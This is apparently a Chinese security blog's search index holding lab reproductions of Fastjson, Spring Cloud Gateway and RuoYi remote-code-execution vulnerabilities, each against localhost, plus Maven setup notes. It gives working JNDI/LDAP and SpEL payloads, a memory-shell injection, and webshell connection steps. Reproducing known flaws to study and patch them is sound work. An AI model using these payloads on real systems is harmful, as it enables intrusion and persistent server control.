<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JNDI、ldap与rmi</title>
      <link href="/2024/06/27/JNDI%E3%80%81LDAP%E4%B8%8ERMI/"/>
      <url>/2024/06/27/JNDI%E3%80%81LDAP%E4%B8%8ERMI/</url>
      
        <content type="html"><![CDATA[<h1 id="1-JNDI"><a href="#1-JNDI" class="headerlink" title="1 JNDI"></a>1 JNDI</h1><p>Java命名和目录<code>接口</code>（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p><h1 id="2-ldap"><a href="#2-ldap" class="headerlink" title="2 ldap"></a>2 ldap</h1><p>LDAP 是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。</p><h1 id="3-rmi"><a href="#3-rmi" class="headerlink" title="3 rmi"></a>3 rmi</h1><p>Java远程方法调用，即Java RMI（Java Remote Method Invocation），是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。</p><p>RMI全称为Remote Method Invocation，也就是远程方法调用，通俗点解释，就是跨越jvm，调用一个远程方法。众所周知，一般情况下java方法调用指的是同一个jvm内方法的调用，而RMI与之恰恰相反。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson反序列化RCE</title>
      <link href="/2024/06/25/Fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/06/25/Fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Fastjson介绍"><a href="#1-Fastjson介绍" class="headerlink" title="1 Fastjson介绍"></a>1 Fastjson介绍</h1><p>Fastjson是一个Java 库，是阿里巴巴开源的JSON解析库，可以将Java对象转换为JSON字符串（序列化），也可以从 JSON 字符串转换为Java对象（反序列化）。</p><h1 id="2-AutoType介绍"><a href="#2-AutoType介绍" class="headerlink" title="2 AutoType介绍"></a>2 AutoType介绍</h1><p>当一个类中包含了一个接口或抽象类，在使用Fastjson进行序列化的时候，会将子类型抹去，只保留接口或抽象类的类型，导致再进行反序列化时无法拿到原始类型。</p><p>为了解决这个问题，在Fastjson中引入了<code>AutoType</code>机制，简单来说，既然无法正常反序列化是由于<code>序列化时把原始类型擦除掉</code>导致的，那么在序列化时，把类型信息给添加上就可以了，所以在使用AutoType机制进行序列化时，序列化出来的json数据会带上<code>@type</code>字段，以记录被序列化的类型，弥补类型擦除的问题。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;@type&quot;:&quot;xxxxxxx&quot;</span><br><span class="line">..........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-漏洞原理"><a href="#3-漏洞原理" class="headerlink" title="3 漏洞原理"></a>3 漏洞原理</h1><p>Fastjson在对json字符串进行反序列化的时候，会读取<code>@type</code>的内容，并且会调用这个类的setter方法。</p><p>利用这个特性，攻击者可以构造一个json字符串，并使用<code>@type</code>指定一个攻击类库，进行攻击。</p><p>比如，<code>com.sun.rowset.JdbcRowSetImpl</code>（Fastjson已将其加入黑名单）是sun官方提供的一个类库，这个类的<code>dataSourceName</code>支持传入一个ldap或者rmi的uri，当解析这个uri的时候，就会进行远程方法调用，去指定的地址中调用方法。因此可以利用JNDI注入工具进行命令执行。</p><h1 id="4-影响版本"><a href="#4-影响版本" class="headerlink" title="4 影响版本"></a>4 影响版本</h1><p>CVE编号：CVE-2017-18349</p><p>Fastjson&lt;1.2.25</p><p>在v1.2.25之前，AutoType是默认开启的，且未对@type字段进行安全性验证，可以说是裸着的。</p><p>根据官方给出的补丁文件，主要的更新在这个 checkAutoType 函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。</p><h1 id="5-命令执行"><a href="#5-命令执行" class="headerlink" title="5 命令执行"></a>5 命令执行</h1><p>环境文件：<a href="https://pan.baidu.com/s/1jEJ2mbq04yffOeuG59Gb-g?pwd=hqqb">https://pan.baidu.com/s/1jEJ2mbq04yffOeuG59Gb-g?pwd=hqqb</a> </p><ol><li>在idea中打开，并等待Maven加载完毕，打开运行文件并运行项目。</li></ol><p><img src="/img/image-20240628094614866.png" alt="image-20240628094614866"></p><p><img src="/img/image-20240628094936941.png" alt="image-20240628094936941"></p><p>2.打开Burp，浏览器访问<code>127.0.0.1:8081</code>，把数据包发送到Repeater。</p><p><img src="/img/image-20240628095153097.png" alt="image-20240628095153097"></p><p>3.运行JNDI注入工具。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 127.0.0.1 -u  #查看支持的payload</span><br><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 127.0.0.1     #运行工具</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240628104024949.png" alt="image-20240628104024949"></p><p><code>ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho</code>：用于在中间件为 <code>Tomcat</code> 时，命令执行结果的回显，通过添加自定义<code>header</code> <code>cmd: whoami</code> 的方式传递想要执行的命令。</p><p>4.将请求方式改为POST，并在header中添加<code>cmd: echo 123</code>，并粘贴如下json数据。</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/img/image-20240628104918249.png" alt="image-20240628104918249"></p><p>5.发送数据包，可以看到<code>echo 123</code>命令已经在目标计算机执行了。</p><p><img src="/img/image-20240628104955139.png" alt="image-20240628104955139"></p><h1 id="6-冰蝎连接"><a href="#6-冰蝎连接" class="headerlink" title="6 冰蝎连接"></a>6 冰蝎连接</h1><p>查看JNDI工具支持的冰蝎连接payload。</p><p><img src="/img/image-20240628105306083.png" alt="image-20240628105306083"></p><p>更换payload并发送数据包。</p><p><img src="/img/image-20240628111248789.png" alt="image-20240628111248789"></p><p>浏览器访问<code>127.0.1:8081/ateam</code>，应该是空白一片，说明注入成功，如果不是空白反而显示一些报错信息，重启项目或重启JNDI工具。</p><p><img src="/img/image-20240628111431439.png" alt="image-20240628111431439"></p><p>使用命令打开冰蝎工具。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure><p>连接目标URL，脚本类型选jsp，密码是<code>pass1024</code>。</p><p><img src="/img/image-20240628111614830.png" alt="image-20240628111614830"></p><p>完成连接。</p><p><img src="/img/image-20240628111821383.png" alt="image-20240628111821383"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Gateway远程命令执行漏洞复现</title>
      <link href="/2024/06/23/Spring%20Cloud%20Gateway%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/06/23/Spring%20Cloud%20Gateway%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Spring-Cloud-Gateway-介绍"><a href="#1-Spring-Cloud-Gateway-介绍" class="headerlink" title="1 Spring Cloud Gateway 介绍"></a>1 Spring Cloud Gateway 介绍</h1><p>Spring Cloud Gateway 是基于 Spring Framework 5、Spring Boot 2.0 和 Project Reactor 技术开发的网关，提供简单有效且统一的路由管理方式。</p><h1 id="2-漏洞说明"><a href="#2-漏洞说明" class="headerlink" title="2 漏洞说明"></a>2 漏洞说明</h1><p>某些使用Spring Colud Gateway的应用程序，若启用且暴露了Gateway Actuator接口，攻击者可以通过此接口，利用SpEL表达式进行命令注入。</p><p>CVE编号：CVE-2022-22947</p><p>此次漏洞复现版本：<code>Spring Cloud Gateway 3.1.0</code></p><h1 id="3-影响的版本"><a href="#3-影响的版本" class="headerlink" title="3 影响的版本"></a>3 影响的版本</h1><ul><li>3.1.0</li><li>3.0.0-3.0.6</li><li>3.0.0之前的版本</li></ul><h1 id="4-漏洞环境搭建"><a href="#4-漏洞环境搭建" class="headerlink" title="4 漏洞环境搭建"></a>4 漏洞环境搭建</h1><h2 id="4-1-新建Spring-Boot项目"><a href="#4-1-新建Spring-Boot项目" class="headerlink" title="4.1 新建Spring Boot项目"></a>4.1 新建Spring Boot项目</h2><p>服务器URL修改为阿里云的<code>https://start.aliyun.com</code>，否则下方Java版本下拉框没有8。因为国外服务商提倡使用Java较新的版本，所以不提供8了。</p><p>类型选择Maven。</p><p><img src="/img/image-20240623165132754.png" alt="image-20240623165132754"></p><p>Spring Boot版本选择2.6.13，并勾选Spring Web。</p><p><img src="/img/image-20240623223226067.png" alt="image-20240623223226067"></p><p>本来我Spring Boot版本选择了2.4.2，但是最后运行的时候报错提示Spring Cloud版本与Spring Boot版本不兼容，需更换成Spring Boot 2.6.x。</p><p>经过查阅资料得知<code>Spring Cloud Gateway 3.1.0</code>对应的Spring Cloud版本是2021.0.3，而Spring Cloud 2021.0.3与<code>2.6.1&lt;= Spring Boot &lt;3.0.0-M1</code>兼容。</p><p><img src="/img/image-20240623223051800.png" alt="image-20240623223051800"></p><h2 id="4-2-Maven配置"><a href="#4-2-Maven配置" class="headerlink" title="4.2 Maven配置"></a>4.2 Maven配置</h2><p><a href="https://qeminco.github.io/2024/06/21/idea%E9%85%8D%E7%BD%AEMaven/">idea配置Maven</a></p><h2 id="4-3-修改pom-xml"><a href="#4-3-修改pom-xml" class="headerlink" title="4.3 修改pom.xml"></a>4.3 修改pom.xml</h2><p>把下图红框部分更换。</p><p><img src="/img/image-20240623224933379.png" alt="image-20240623224933379"></p><p>更换的代码：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>更换后刷新一下依赖，点击Maven刷新按钮：</p><p><img src="/img/image-20240623225245320.png" alt="image-20240623225245320"></p><h2 id="4-4-修改YAML配置文件"><a href="#4-4-修改YAML配置文件" class="headerlink" title="4.4 修改YAML配置文件"></a>4.4 修改YAML配置文件</h2><p>将application.properties重命名为application.yml</p><p><img src="/img/image-20240623231347290.png" alt="image-20240623231347290"></p><p>打开application.yml文件，删除所有原内容，修改为如下内容：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">gateway</span></span><br><span class="line">  <span class="attr">endpoint:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>port设置为8081是为了避免与Burp的代理端口冲突，导致项目运行不起来。</p><p><img src="/img/image-20240623231612672.png" alt="image-20240623231612672"></p><h2 id="4-5-启动项目"><a href="#4-5-启动项目" class="headerlink" title="4.5 启动项目"></a>4.5 启动项目</h2><p>打开DemoApplication文件，点击右上角的启动按钮。</p><p><img src="/img/image-20240623231900388.png" alt="image-20240623231900388"></p><h1 id="5-漏洞复现"><a href="#5-漏洞复现" class="headerlink" title="5 漏洞复现"></a>5 漏洞复现</h1><p>打开谷歌浏览器，打开代理插件，在不代理的地址列表添加：<code>&lt;-loopback&gt;</code>，强制让谷歌浏览器代理回环地址，否则Burp抓不到127.0.0.1的包。</p><p><img src="/img/image-20240623232327177.png" alt="image-20240623232327177"></p><p>打开Burp，然后浏览器访问<code>http://127.0.0.1:8081/actuator/gateway/routes</code>，在Burp中把该数据包发送到Repeater。</p><p><img src="/img/image-20240623232634853.png" alt="image-20240623232634853"></p><p>然后构造一个路由test，使用post请求它。</p><p>请求体Body内容如下，使用SpEL表达式执行<code>whoami</code>命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;test&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;whoami\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240623234224222.png" alt="image-20240623234224222"></p><p>使用post请求<code>/actuator/gateway/refresh</code>，刷新路由，使刚刚添加的test路由生效。最后要空两行，这是请求包的格式，否则发送不了。</p><p><img src="/img/image-20240623235138400.png" alt="image-20240623235138400"></p><p>用get请求添加的test路由，可以发现whoami命令被执行了（打码处为执行结果）。</p><p><img src="/img/image-20240623235535987.png" alt="image-20240623235535987"></p><h1 id="6-注入内存马"><a href="#6-注入内存马" class="headerlink" title="6 注入内存马"></a>6 注入内存马</h1><p>修改Body内容如下：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Path&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;args&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_genkey_0&quot;</span><span class="punctuation">:</span><span class="string">&quot;/gmem/**&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wolaile&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Result&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;com.example.GMemShell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,&#x27;/gmem&#x27;)&#125;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://test.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/img/image-20240624000002113.png" alt="image-20240624000002113"></p><p>刷新路由，然后访问test路由，发现注入内存马成功。</p><p><img src="/img/image-20240624000139964.png" alt="image-20240624000139964"></p><p>使用哥斯拉连接<code>http://127.0.0.1:8081/gmem</code>。</p><p><img src="/img/image-20240624000503963.png" alt="image-20240624000503963"></p><p><img src="/img/image-20240624000703365.png" alt="image-20240624000703365"></p><h1 id="7-修复建议"><a href="#7-修复建议" class="headerlink" title="7 修复建议"></a>7 修复建议</h1><p>3.1.x 版本用户应升级到 3.1.1+ 版本，3.0.x 版本用户应升级到 3.0.7+ 版本。<br>或者在不考虑影响业务的情况下禁用 Gateway actuator 接口：如application.properties 中配置 management.endpoint.gateway.enabled 为 false。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 远程命令执行 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idea配置Maven</title>
      <link href="/2024/06/21/idea%E9%85%8D%E7%BD%AEMaven/"/>
      <url>/2024/06/21/idea%E9%85%8D%E7%BD%AEMaven/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Maven概述"><a href="#1-Maven概述" class="headerlink" title="1 Maven概述"></a>1 Maven概述</h1><p>Maven用于管理Java项目的自动化构建和依赖。</p><h1 id="2-下载Maven"><a href="#2-下载Maven" class="headerlink" title="2 下载Maven"></a>2 下载Maven</h1><p>官网：<a href="https://maven.apache.org/download.cgi">Maven – Download Apache Maven</a></p><p><img src="/img/image-20240620092933501.png" alt="image-20240620092933501"></p><h1 id="3-配置Maven环境变量"><a href="#3-配置Maven环境变量" class="headerlink" title="3 配置Maven环境变量"></a>3 配置Maven环境变量</h1><p>新建<code>MAVEN_HOME</code></p><p><img src="/img/image-20240620112408806.png" alt="image-20240620112408806"></p><p>添加Path变量<code>%MAVEN_HOME%\bin</code></p><p><img src="/img/image-20240620112730146.png" alt="image-20240620112730146"></p><p>验证：</p><p><img src="/img/image-20240620113041394.png" alt="image-20240620113041394"></p><h1 id="4-设置本地仓库"><a href="#4-设置本地仓库" class="headerlink" title="4 设置本地仓库"></a>4 设置本地仓库</h1><p>新建一个repository文件夹，最好创建在D盘，避免以后这个文件夹的jar包太多导致c盘空间不够。</p><p>项目会先从本地仓库中寻找依赖，如果找不到，再会去中央仓库下载，下载下来的依赖包会被保存到本地仓库。</p><p><img src="/img/image-20240620113236650.png" alt="image-20240620113236650"></p><p>在settings.xml文件中找到仓库配置，并修改。</p><p><img src="/img/image-20240620113635235.png" alt="image-20240620113635235"></p><h1 id="5-配置Maven下载镜像"><a href="#5-配置Maven下载镜像" class="headerlink" title="5 配置Maven下载镜像"></a>5 配置Maven下载镜像</h1><p>在mirrors标签里添加阿里云镜像的配置，加载依赖速度更快。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 阿里镜像 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/repositories/central/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/image-20240624101231898.png" alt="image-20240624101231898"></p><h1 id="6-IDEA配置Maven"><a href="#6-IDEA配置Maven" class="headerlink" title="6 IDEA配置Maven"></a>6 IDEA配置Maven</h1><p><img src="/img/image-20240620114216678.png" alt="image-20240620114216678"></p><p><img src="/img/image-20240620114528139.png" alt="image-20240620114528139"></p><p>使新建项目默认配置好Maven：</p><p><img src="/img/image-20240624121921506.png" alt="image-20240624121921506"></p><p><img src="/img/image-20240620114528139.png" alt="image-20240620114528139"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rce</title>
      <link href="/2024/06/21/rce/"/>
      <url>/2024/06/21/rce/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fcf38e162e36b4f31903fb51e71368d331ad33ca2bd5119ee0076fa530bd8bf9">d17384dd115480b410a014719db93efec6a2aaad25bb377c8d561ba00f6658a9c2f8e06fa23463a4daf75d8c80456719090887ba283b9ab7d4babf8066cb9caeed4332fea6d591dc600e5cd89489fae97c3234f99070b70d2ecc476e5e8299442a5edc1a340061263e8f249e5b0fcec1069430958a9909ab1dd8a9db4a11865de53c8b7e5954c4204e7c85ef023a60211971175e4e86d93508689250b6554ca512f9515ba3de9ce6a67b09c6f767839048ded1865f646edea7cdf1486acadb51fc06b58125ee32223f5d00356b92ee64fd6038be3942de8ade03c62d0a7c55d102f889758a5e2ca195e0c6cde932c44bc98fec2ba5ab1083c6a57c43d41aedc2081975e3bc60d18305db1d52a18d1246c4b261fbd11b052786b4c1c85d29c0b0758ca08d071db6ca87bac110b33dd430d8ffbc89e185f9ab22aea551d3cb00b2d1c9a31a0a041f9d999ccd1803e6b2a413e599b7a009edba701c0a947953f41ff9cc510a1a7c8dbc677fb89f2000b76d509878cec2d567e05caa6606eaeac9b51bc5dd947531b6d23906602a4bbcd80431e689a669ace2f6f80b7e1ff80574169081547d723580f7f773925ea5e8fad4ce60381bec2632763fb30134619e1c1a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 远程命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>若依后台定时任务rce</title>
      <link href="/2024/06/21/%E8%8B%A5%E4%BE%9D%E5%90%8E%E5%8F%B0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1rce/"/>
      <url>/2024/06/21/%E8%8B%A5%E4%BE%9D%E5%90%8E%E5%8F%B0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1rce/</url>
      
        <content type="html"><![CDATA[<h1 id="1-影响版本"><a href="#1-影响版本" class="headerlink" title="1 影响版本"></a>1 影响版本</h1><p>&lt;&#x3D;4.7.8</p><h1 id="2-搭建若依系统"><a href="#2-搭建若依系统" class="headerlink" title="2 搭建若依系统"></a>2 搭建若依系统</h1><p>若依官方部署文档<a href="https://doc.ruoyi.vip/ruoyi/document/hjbs.html">环境部署 | RuoYi</a></p><h2 id="2-1-下载"><a href="#2-1-下载" class="headerlink" title="2.1 下载"></a>2.1 下载</h2><p><a href="https://gitee.com/y_project/RuoYi/releases">https://gitee.com/y_project/RuoYi/releases</a></p><p>下载4.7.8版本</p><h2 id="2-2-打开本地MySQL服务"><a href="#2-2-打开本地MySQL服务" class="headerlink" title="2.2 打开本地MySQL服务"></a>2.2 打开本地MySQL服务</h2><p>我用的MySQL5.7.26</p><h2 id="2-3-导入SQL文件"><a href="#2-3-导入SQL文件" class="headerlink" title="2.3 导入SQL文件"></a>2.3 导入SQL文件</h2><p>创建一个名为<code>ruoyi</code>的数据库，并导入若依的SQL文件。</p><p><img src="/img/image-20240621153939909.png" alt="image-20240621153939909"></p><p><img src="/img/image-20240621154013761.png" alt="image-20240621154013761"></p><h2 id="2-4-idea配置若依项目"><a href="#2-4-idea配置若依项目" class="headerlink" title="2.4 idea配置若依项目"></a>2.4 idea配置若依项目</h2><p>Maven已配置。</p><p>然后修改数据库名称及账号密码。</p><p><img src="/img/image-20240621154243443.png" alt="image-20240621154243443"></p><p>修改Java版本。</p><p><img src="/img/image-20240621155320856.png" alt="image-20240621155320856"></p><h1 id="3-漏洞验证"><a href="#3-漏洞验证" class="headerlink" title="3 漏洞验证"></a>3 漏洞验证</h1><h2 id="3-1-准备工作"><a href="#3-1-准备工作" class="headerlink" title="3.1 准备工作"></a>3.1 准备工作</h2><p>登录进去后，编辑id为2的定时任务，都打开。</p><p><img src="/img/image-20240621155723387.png" alt="image-20240621155723387"></p><p><img src="/img/image-20240621155744149.png" alt="image-20240621155744149"></p><h2 id="3-2-启用漏洞工具"><a href="#3-2-启用漏洞工具" class="headerlink" title="3.2 启用漏洞工具"></a>3.2 启用漏洞工具</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240621155954744.png" alt="image-20240621155954744"></p><h2 id="3-3-payload十六进制编码"><a href="#3-3-payload十六进制编码" class="headerlink" title="3.3 payload十六进制编码"></a>3.3 payload十六进制编码</h2><p>复制生成的链接</p><p><img src="/img/image-20240621160240761.png" alt="image-20240621160240761"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javax.naming.InitialContext.lookup(&#x27;ldap://127.0.0.1:1389/ywrp1p&#x27;)</span><br></pre></td></tr></table></figure><p>转换成十六进制后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3132372E302E302E313A313338392F7977727031702729</span><br></pre></td></tr></table></figure><h2 id="3-4-组合拳"><a href="#3-4-组合拳" class="headerlink" title="3.4 组合拳"></a>3.4 组合拳</h2><p>利用之前若依的SQL注入漏洞，把payload注入到<code>调用目标字符串</code>。</p><p>注入命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">genTableServiceImpl.createTable(&#x27;UPDATE sys_job SET invoke_target = 0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3132372E302E302E313A313338392F7977727031702729 WHERE job_id = 2;&#x27;)</span><br></pre></td></tr></table></figure><p>转换成十六进制，是因为<code>JobInvokeUtil</code>在调用过程中不允许在字符串中使用括号，绕过一下这个规则。</p><p>新建定时任务：</p><p><img src="/img/image-20240621163230823.png" alt="image-20240621163230823"></p><p>打开新建的任务状态：</p><p><img src="/img/image-20240621163301407.png" alt="image-20240621163301407"></p><p>可以看到任务id为2的<code>调用目标字符串</code>已被注入成写好的payload。</p><p><img src="/img/image-20240621163343723.png" alt="image-20240621163343723"></p><p>更多操作——&gt;执行一次。</p><p><img src="/img/image-20240621163550351.png" alt="image-20240621163550351"></p><p>看看cmd窗口，可以看到payload已被执行。</p><p><img src="/img/image-20240621163657718.png" alt="image-20240621163657718"></p><h1 id="4-漏洞修复"><a href="#4-漏洞修复" class="headerlink" title="4 漏洞修复"></a>4 漏洞修复</h1><p>升级到最新版本。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo d报错</title>
      <link href="/2024/06/19/hexo%20d%E6%8A%A5%E9%94%99/"/>
